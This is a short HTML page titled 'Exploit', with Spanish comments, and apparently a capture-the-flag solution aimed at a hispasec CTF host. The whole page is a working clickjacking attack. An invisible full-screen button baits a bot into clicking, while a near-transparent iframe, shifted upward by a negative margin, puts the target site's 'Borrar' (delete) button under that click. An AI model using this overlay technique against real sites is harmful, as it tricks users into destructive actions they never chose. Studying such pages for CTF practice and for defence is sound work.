<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Exploit</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }

        /* El botón que el bot buscará. Lo hacemos gigante. */
        #objetivo {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1; /* Estará "detrás" pero el bot lo detectará */
            opacity: 0; /* Invisible para no estorbar visualmente */
        }

        /* Contenedor del iframe para recortar y ver solo el botón de borrar */
        .iframe-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2; /* Encima para recibir el clic */
            opacity: 0.0001; /* Casi invisible */
        }

        iframe {
            width: 100%;
            height: 2000px; /* Altura grande para que quepa todo */
            border: none;
            /* AJUSTE DE SCROLL: 
               Este margen negativo "empuja" la página hacia arriba 
               para que el botón 'Borrar' de la librería aparezca arriba del todo. */
            margin-top: -700px; 
        }
    </style>
</head>
<body>

    <button id="objetivo">CLICK</button>

    <div class="iframe-container">
        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

</body>
</html>
